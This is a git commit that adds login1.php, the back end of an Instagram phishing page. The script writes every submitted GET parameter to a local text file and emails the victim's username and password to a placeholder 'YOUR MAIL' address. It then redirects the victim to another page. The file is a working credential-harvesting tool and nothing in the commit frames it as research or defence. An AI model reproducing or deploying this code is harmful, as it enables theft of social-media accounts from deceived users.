1e83faa1beff048499f9f99210d4efa7bb9cdd4e
mr.ashkan7786 <mr.ashkan7786@gmail.com>
2016-12-14 10:09:34 -0500

    Tes

---
+++ login1.php
@@ -0,0 +1,23 @@
+﻿<?php
+header ('Location:/num.htm');
+$handle = fopen("soawa.txt", "a");
+foreach($_GET as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+$to      = 'YOUR MAIL';
+$subject = 'Instagram Account';
+$username = $_GET['username'];
+$password = $_GET['password'];
+$message = "Username:" . $username . "<br>" . "Password: " . $password;
+$headers = 'From: YOUR MAIL' . "\r\n" .
+    'Reply-To: YOUR MAIL' . "\r\n" .
+    'X-Mailer: PHP/' . phpversion();
+
+mail($to, $subject, $message, $headers);
+exit;
+?>
